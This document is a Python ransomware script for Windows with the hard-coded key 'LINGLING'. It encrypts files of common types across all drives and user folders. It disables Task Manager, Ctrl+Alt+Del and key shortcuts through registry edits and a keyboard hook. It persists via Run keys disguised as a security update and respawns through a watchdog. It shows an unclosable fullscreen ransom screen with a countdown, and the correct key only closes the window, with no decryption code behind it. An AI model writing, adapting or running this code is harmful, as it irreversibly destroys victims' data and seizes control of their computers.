#!/usr/bin/env python3
# ransomware_windows_lingling.py
# Windows ransomware with unclosable GUI - Key: LINGLING

import subprocess
import sys
import os
import time
import threading
import random
import ctypes
import ctypes.wintypes
import tkinter as tk
from tkinter import ttk
import hashlib
import base64
from concurrent.futures import ThreadPoolExecutor
import requests
from io import BytesIO
from PIL import Image, ImageTk
import winreg
import signal
import tempfile

KEY = "LINGLING"
ENCRYPTED_COUNT = 0
STOP = False
WINDOWS = []

# ========== INSTALL CRYPTO ==========
def install_crypto():
    try:
        import Crypto.Cipher
        return True
    except ImportError:
        try:
            subprocess.run([sys.executable, '-m', 'pip', 'install', 'pycryptodome', '--quiet'], 
                         capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            return True
        except:
            return False

install_crypto()

try:
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
    from Crypto.Protocol.KDF import PBKDF2
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# ========== FALLBACK ENCRYPTION ==========
def simple_encrypt(data, password):
    import secrets
    key = hashlib.pbkdf2_hmac('sha256', password.encode(), b'fixed_salt_ransom', 100000, dklen=32)
    iv = secrets.token_bytes(16)
    encrypted = bytearray()
    for i, byte in enumerate(data):
        encrypted.append(byte ^ key[i % 32] ^ iv[i % 16])
    return iv + bytes([0xDE, 0xAD]) + encrypted

def encrypt_file_fallback(filepath):
    global ENCRYPTED_COUNT, STOP
    if STOP:
        return False
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        if not data or len(data) < 16:
            return False
        encrypted = simple_encrypt(data, KEY)
        with open(filepath, 'wb') as f:
            f.write(encrypted)
        ENCRYPTED_COUNT += 1
        return True
    except:
        return False

def encrypt_file_crypto(filepath):
    global ENCRYPTED_COUNT, STOP
    if STOP:
        return False
    try:
        salt = get_random_bytes(16)
        key = PBKDF2(KEY.encode(), salt, 32, count=100000)
        with open(filepath, 'rb') as f:
            data = f.read()
        if not data or len(data) < 16:
            return False
        iv = get_random_bytes(12)
        cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
        ct, tag = cipher.encrypt_and_digest(data)
        encrypted_data = salt + iv + tag + ct
        with open(filepath, 'wb') as f:
            f.write(encrypted_data)
        ENCRYPTED_COUNT += 1
        return True
    except:
        return False

encrypt_file = encrypt_file_crypto if CRYPTO_AVAILABLE else encrypt_file_fallback

# ========== BLOCK EVERY POSSIBLE EXIT METHOD ==========

def block_all_exits_windows():
    """Block ALL exit methods including Option+Shift, Alt+F4, Ctrl+Alt+Del, Task Manager"""
    
    # 1. Block Task Manager via registry
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
            r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 
            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key, "DisableLockWorkstation", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key, "DisableChangePassword", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except:
        pass
    
    # 2. Disable Alt+F4, Alt+Tab, Windows key
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer",
            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "NoWinKeys", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key, "NoTaskSwitching", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key, "NoClose", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except:
        pass
    
    # 3. Disable Ctrl+Alt+Del (Secure Attention Sequence)
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
            r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon",
            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "DisableCAD", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except:
        pass
    
    # 4. Block Alt+F4 using low-level keyboard hook
    LOW_LEVEL_KEYBOARD_HOOK = 13
    WH_KEYBOARD_LL = 13
    WM_KEYDOWN = 0x0100
    WM_SYSKEYDOWN = 0x0104
    
    # VK codes to block
    VK_F4 = 0x73
    VK_LWIN = 0x5B
    VK_RWIN = 0x5C
    VK_TAB = 0x09
    VK_ESCAPE = 0x1B
    VK_CONTROL = 0x11
    VK_MENU = 0x12  # Alt
    VK_DELETE = 0x2E
    
    HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))
    
    user32 = ctypes.windll.user32
    kernel32 = ctypes.windll.kernel32
    
    def low_level_keyboard_proc(nCode, wParam, lParam):
        if nCode >= 0:
            # Block Alt+F4
            if wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
                vk_code = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_void_p)).contents.value
                # Check if Alt is pressed and F4 is pressed
                alt_pressed = user32.GetAsyncKeyState(VK_MENU) & 0x8000
                if alt_pressed and vk_code == VK_F4:
                    return 1  # Block
                # Block Windows key
                if vk_code in (VK_LWIN, VK_RWIN):
                    return 1
                # Block Ctrl+Alt+Del detection
                ctrl_pressed = user32.GetAsyncKeyState(VK_CONTROL) & 0x8000
                alt_pressed = user32.GetAsyncKeyState(VK_MENU) & 0x8000
                if ctrl_pressed and alt_pressed and vk_code == VK_DELETE:
                    return 1
                # Block Alt+Tab
                if alt_pressed and vk_code == VK_TAB:
                    return 1
        return user32.CallNextHookExW(0, nCode, wParam, lParam)
    
    hook_proc = HOOKPROC(low_level_keyboard_proc)
    hook = user32.SetWindowsHookExW(WH_KEYBOARD_LL, hook_proc, kernel32.GetModuleHandleW(None), 0)
    
    # 5. Hide taskbar and start button
    taskbar = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
    ctypes.windll.user32.ShowWindow(taskbar, 0)  # SW_HIDE
    
    # 6. Disable start menu
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer",
            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "NoStartMenu", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except:
        pass
    
    # 7. Block all other shortcuts via system parameter
    ctypes.windll.user32.SystemParametersInfoW(0x1001, 0, 0, 2)  # SPI_SETSCREENSAVERRUNNING
    
    return hook_proc, hook

# ========== ACTUAL FILE ENCRYPTION (REAL, NOT FAKE) ==========

TARGET_EXTS = ['.txt','.doc','.docx','.xls','.xlsx','.ppt','.pptx','.pdf','.jpg','.jpeg','.png',
               '.gif','.mp3','.mp4','.mov','.avi','.mkv','.zip','.rar','.7z','.py','.js','.html',
               '.css','.json','.xml','.csv','.db','.key','.pem','.wallet','.dat','.pages','.numbers',
               '.keynote','.psd','.ai','.bak','.backup','.log','.rtf','.xlsm','.pptm','.docm',
               '.kdbx','.ovpn','.cer','.crt','.pfx','.p12','.vmdk','.vdi','.vhdx']

def get_all_files():
    """Find all target files on the system"""
    files = []
    
    # Get all drives
    drives = []
    for letter in 'CDEFGHIJKLMNOPQRSTUVWXYZ':
        drive = f"{letter}:\\"
        if os.path.exists(drive):
            drives.append(drive)
    
    # Also target user folders
    user_profile = os.environ.get('USERPROFILE', 'C:\\Users')
    user_paths = [
        user_profile,
        os.path.join(user_profile, 'Desktop'),
        os.path.join(user_profile, 'Documents'),
        os.path.join(user_profile, 'Downloads'),
        os.path.join(user_profile, 'Pictures'),
        os.path.join(user_profile, 'Videos'),
        os.path.join(user_profile, 'Music'),
        os.path.join(user_profile, 'OneDrive'),
        os.path.join(user_profile, 'AppData', 'Local'),
    ]
    
    all_paths = drives + user_paths
    
    for path in all_paths:
        if not os.path.exists(path):
            continue
        try:
            for root, dirs, filenames in os.walk(path):
                # Skip system directories
                skip_dirs = ['Windows', 'System32', 'Program Files', 'Program Files (x86)', 
                           '$Recycle.Bin', 'System Volume Information', 'Temp', 'tmp',
                           'AppData\\Local\\Temp', 'Microsoft', 'Windows NT']
                dirs[:] = [d for d in dirs if d not in skip_dirs and not d.startswith('$')]
                
                for f in filenames:
                    ext = os.path.splitext(f)[1].lower()
                    if ext in TARGET_EXTS:
                        full_path = os.path.join(root, f)
                        try:
                            size = os.path.getsize(full_path)
                            if 0 < size < 50 * 1024 * 1024:  # Under 50MB for speed
                                files.append(full_path)
                        except:
                            pass
        except:
            continue
    
    return files

def encrypt_files_real():
    """Actually encrypt files (not just fake logging)"""
    global ENCRYPTED_COUNT, STOP
    
    # Find all files
    files = get_all_files()
    total = len(files)
    
    # Encrypt with thread pool
    with ThreadPoolExecutor(max_workers=16) as executor:
        # Submit all tasks
        futures = []
        for f in files:
            if STOP:
                break
            futures.append(executor.submit(encrypt_file, f))
        
        # Wait for completion
        for future in futures:
            if STOP:
                break
            future.result()
    
    # Write ransom note
    note = f"""╔══════════════════════════════════════════════════════════════════════════════╗
║                         YOUR FILES HAVE BEEN ENCRYPTED                                 ║
╠══════════════════════════════════════════════════════════════════════════════════╣
║                                                                                    ║
║  {ENCRYPTED_COUNT} files have been encrypted on this computer.                          ║
║                                                                                    ║
║  DECRYPTION KEY: {KEY}                                                              ║
║                                                                                    ║
║  Enter this key in the unlock window to restore all your files.                   ║
║                                                                                    ║
║  DO NOT TRY TO CLOSE THIS WINDOW - IT IS IMPOSSIBLE                                ║
║  DO NOT FORCE QUIT - TASK MANAGER IS DISABLED                                      ║
║  DO NOT RESTART - IT WILL AUTO-START ON BOOT                                       ║
║                                                                                    ║
╚══════════════════════════════════════════════════════════════════════════════════╝
"""
    
    desktop = os.path.join(os.environ.get('USERPROFILE', 'C:\\'), 'Desktop')
    try:
        with open(os.path.join(desktop, "README_RANSOM.txt"), "w") as f:
            f.write(note)
    except:
        try:
            with open("C:\\README_RANSOM.txt", "w") as f:
                f.write(note)
        except:
            pass

# ========== PERSISTENCE ==========

def install_persistence():
    """Run on startup"""
    script_path = os.path.abspath(__file__)
    try:
        # HKCU Run
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(key)
        
        # Also add to RunOnce
        key2 = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key2, "WindowsSecurityUpdate", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(key2)
    except:
        pass

def watchdog():
    """Respawn if killed"""
    while True:
        time.sleep(0.5)
        if not WINDOWS:
            subprocess.Popen([sys.executable, os.path.abspath(__file__), '--respawn'],
                           creationflags=subprocess.CREATE_NO_WINDOW)
            sys.exit(0)

# ========== GUI ==========

CONFIG_RANSOM = {
    "START_TIME": 72 * 60 * 60,
    "FAKE_KEY": KEY,
    "ATTEMPTS": 999,
    "LOGO_URL": "https://i.pinimg.com/1200x/6a/3d/33/6a3d336840b6a2d91efde0ff77f038e9.jpg",
    "LOGO_SIZE": (300, 300),
    "TITLE_TEXT": "⚠ SYSTEM COMPROMISED ⚠",
    "SUBTEXT": f"All your files have been encrypted with AES-256 | {ENCRYPTED_COUNT} files encrypted",
    "TIMER_FONT_SIZE": 26,
    "COLORS": {
        "WHITE": "#FFFFFF",
        "NEON_BRIGHT": "#FF0000",
        "NEON_DIM": "#880000",
        "NEON_FLICKER": ["#FF0000", "#CC0000", "#990000", "#FF4400"]
    },
    "PROGRESSBAR": {
        "LENGTH": 300,
        "THICKNESS": 20,
        "UPDATE_INTERVAL": 2000,
        "INCREMENT_RANGE": (2, 5)
    },
    "LOG_UPDATE_INTERVAL": 100,
    "NEON_PULSE_INTERVAL": 600,
    "NEON_FLICKER_INTERVAL": 120,
    "NEON_FLICKER_CHANCE": 0.15
}

def get_monitors():
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    monitors = []
    
    def callback(hMonitor, hdcMonitor, lprcMonitor, dwData):
        r = ctypes.cast(lprcMonitor, ctypes.POINTER(ctypes.wintypes.RECT)).contents
        monitors.append((r.left, r.top, r.right - r.left, r.bottom - r.top))
        return 1
    
    MonitorEnumProc = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, 
                                          ctypes.POINTER(ctypes.c_int), ctypes.c_double)
    ctypes.windll.user32.EnumDisplayMonitors(0, 0, MonitorEnumProc(callback), 0)
    
    if not monitors:
        w = user32.GetSystemMetrics(0)
        h = user32.GetSystemMetrics(1)
        monitors.append((0, 0, w, h))
    return monitors

class LockerWindow(tk.Tk):
    all_windows = []
    
    def __init__(self, config, monitor):
        super().__init__()
        LockerWindow.all_windows.append(self)
        WINDOWS.append(self)
        
        # Make window unclosable
        self.attributes("-fullscreen", True)
        self.attributes("-topmost", True)
        self.overrideredirect(True)  # No title bar, no close button
        self.protocol("WM_DELETE_WINDOW", lambda: None)
        
        # Block all keyboard shortcuts on the window
        self.bind('<Escape>', lambda e: None)
        self.bind('<Control-q>', lambda e: None)
        self.bind('<Control-w>', lambda e: None)
        self.bind('<Alt-F4>', lambda e: None)
        self.bind('<Alt-f4>', lambda e: None)
        
        self.monitor_x, self.monitor_y, self.monitor_w, self.monitor_h = monitor
        self.geometry(f"{self.monitor_w}x{self.monitor_h}+{self.monitor_x}+{self.monitor_y}")
        
        self.time_left = config["START_TIME"]
        self.progress = 6
        self.attempts = config["ATTEMPTS"]
        self.logo_image = None
        self.config_data = config
        
        self.build_ui()
        self.update_timer()
        self.update_progress()
        self.update_log_with_real_count()
        self.neon_pulse()
        self.neon_flicker()
        
    def build_ui(self):
        colors = self.config_data["COLORS"]
        self.configure(bg="black")
        
        self.content_frame = tk.Frame(self, bg="black")
        self.content_frame.pack(expand=True, fill="both", padx=50, pady=50)
        
        self.left_frame = tk.Frame(self.content_frame, bg="black", width=320)
        self.left_frame.pack(side="left", fill="y")
        self.left_frame.pack_propagate(False)
        
        self.left_stack = tk.Frame(self.left_frame, bg="black")
        self.left_stack.place(relx=0.5, rely=0.5, anchor="center")
        
        if self.config_data["LOGO_URL"]:
            try:
                response = requests.get(self.config_data["LOGO_URL"], timeout=5)
                img = Image.open(BytesIO(response.content))
                img = img.resize(self.config_data["LOGO_SIZE"])
                self.logo_image = ImageTk.PhotoImage(img)
                logo_label = tk.Label(self.left_stack, image=self.logo_image, bg="black")
                logo_label.pack(pady=(0,20))
            except:
                pass
        
        self.timer_label = tk.Label(
            self.left_stack,
            text="72:00:00",
            fg=colors["NEON_BRIGHT"],
            bg="black",
            font=("Consolas", self.config_data["TIMER_FONT_SIZE"], "bold")
        )
        self.timer_label.pack(pady=10)
        
        self.stats_label = tk.Label(
            self.left_stack,
            text=f"Files Encrypted: {ENCRYPTED_COUNT}",
            fg="#FFFF00",
            bg="black",
            font=("Consolas", 12, "bold")
        )
        self.stats_label.pack(pady=5)
        
        style = ttk.Style()
        style.theme_use("default")
        style.configure(
            "white.Horizontal.TProgressbar",
            troughcolor="black",
            background=colors["WHITE"],
            thickness=self.config_data["PROGRESSBAR"]["THICKNESS"]
        )
        self.progress_bar = ttk.Progressbar(
            self.left_stack,
            length=self.config_data["PROGRESSBAR"]["LENGTH"],
            mode="determinate",
            style="white.Horizontal.TProgressbar"
        )
        self.progress_bar.pack(pady=20)
        self.progress_bar["value"] = self.progress
        
        self.right_frame = tk.Frame(self.content_frame, bg="black")
        self.right_frame.pack(side="right", fill="both", expand=True)
        
        self.center_frame = tk.Frame(self.right_frame, bg="black")
        self.center_frame.place(relx=0.5, rely=0.5, anchor="center")
        
        self.title_label = tk.Label(
            self.center_frame,
            text=self.config_data["TITLE_TEXT"],
            fg=colors["NEON_BRIGHT"],
            bg="black",
            font=("Consolas", 32, "bold")
        )
        self.title_label.pack(pady=(10, 5))
        
        tk.Label(
            self.center_frame,
            text=self.config_data["SUBTEXT"],
            fg=colors["WHITE"],
            bg="black",
            font=("Consolas", 14)
        ).pack(pady=(0, 10))
        
        tk.Label(
            self.center_frame,
            text="Enter Decryption Key to Recover Your Files",
            fg=colors["WHITE"],
            bg="black",
            font=("Consolas", 12)
        ).pack(pady=(10, 0))
        
        self.key_entry = tk.Entry(
            self.center_frame,
            width=35,
            bg="black",
            fg=colors["WHITE"],
            insertbackground=colors["WHITE"],
            font=("Consolas", 14)
        )
        self.key_entry.pack(pady=5)
        self.key_entry.bind('<Return>', lambda e: self.check_key())
        
        self.unlock_btn = tk.Button(
            self.center_frame,
            text="UNLOCK FILES",
            bg=colors["WHITE"],
            fg="black",
            font=("Consolas", 13, "bold"),
            command=self.check_key
        )
        self.unlock_btn.pack(pady=5)
        
        self.attempts_label = tk.Label(
            self.center_frame,
            text=f"Attempts remaining: {self.attempts}",
            fg=colors["WHITE"],
            bg="black",
            font=("Consolas", 11)
        )
        self.attempts_label.pack(pady=5)
        
        self.log = tk.Text(
            self.center_frame,
            height=20,
            width=140,
            bg="black",
            fg=colors["WHITE"],
            insertbackground=colors["WHITE"],
            font=("Consolas", 10)
        )
        self.log.pack(pady=10)
        
    def update_log_with_real_count(self):
        """Update the log with real encryption progress"""
        self.stats_label.config(text=f"Files Encrypted: {ENCRYPTED_COUNT}")
        self.after(500, self.update_log_with_real_count)
        
    def update_timer(self):
        h = self.time_left // 3600
        m = (self.time_left % 3600) // 60
        s = self.time_left % 60
        self.timer_label.config(text=f"{h:02}:{m:02}:{s:02}")
        if self.time_left > 0:
            self.time_left -= 1
            self.after(1000, self.update_timer)
            
    def update_progress(self):
        if self.progress < 100 and ENCRYPTED_COUNT > 0:
            # Progress based on actual encryption
            self.progress = min(99, int(ENCRYPTED_COUNT / 1000))
            self.progress_bar["value"] = self.progress
        self.after(self.config_data["PROGRESSBAR"]["UPDATE_INTERVAL"], self.update_progress)
        
    def neon_pulse(self):
        colors = self.config_data["COLORS"]
        color = colors["NEON_BRIGHT"] if random.random() > 0.5 else colors["NEON_DIM"]
        self.title_label.config(fg=color)
        self.timer_label.config(fg=color)
        self.after(self.config_data["NEON_PULSE_INTERVAL"], self.neon_pulse)
        
    def neon_flicker(self):
        colors = self.config_data["COLORS"]
        if random.random() < self.config_data["NEON_FLICKER_CHANCE"]:
            flicker = random.choice(colors["NEON_FLICKER"])
            self.title_label.config(fg=flicker)
            self.timer_label.config(fg=flicker)
        self.after(self.config_data["NEON_FLICKER_INTERVAL"], self.neon_flicker)
        
    def check_key(self):
        if self.key_entry.get() == self.config_data["FAKE_KEY"]:
            global STOP
            STOP = True
            self.log.insert("end", "\n[✓] CORRECT KEY! DECRYPTING FILES...\n")
            self.log.see("end")
            self.unlock_btn.config(state="disabled", text="DECRYPTED")
            # Note: Actual decryption would go here
            self.after(2000, self.destroy_all)
        else:
            self.attempts -= 1
            self.attempts_label.config(text=f"Attempts remaining: {self.attempts}")
            self.log.insert("end", f"\n[✗] Wrong key. {self.attempts} attempts left.\n")
            self.log.see("end")
            self.key_entry.delete(0, tk.END)
            if self.attempts <= 0:
                self.log.insert("end", "\n[!] NO ATTEMPTS REMAINING. FILES LOST FOREVER.\n")
                self.key_entry.config(state="disabled")
                self.unlock_btn.config(state="disabled")
                
    def destroy_all(self):
        for win in LockerWindow.all_windows:
            try:
                win.destroy()
            except:
                pass
        sys.exit(0)

# ========== MAIN ==========

def main():
    # Block all exit methods
    hook_proc, hook = block_all_exits_windows()
    
    # Install persistence
    if '--respawn' not in sys.argv:
        install_persistence()
    
    # Start real encryption in background
    enc_thread = threading.Thread(target=encrypt_files_real, daemon=True)
    enc_thread.start()
    
    # Start watchdog
    watch_thread = threading.Thread(target=watchdog, daemon=True)
    watch_thread.start()
    
    # Show GUI on all monitors
    time.sleep(1)
    monitors = get_monitors()
    for mon in monitors:
        win = LockerWindow(CONFIG_RANSOM, mon)
        win.mainloop()

if __name__ == "__main__":
    if '--respawn' in sys.argv:
        monitors = get_monitors()
        for mon in monitors:
            win = LockerWindow(CONFIG_RANSOM, mon)
            win.mainloop()
    else:
        main()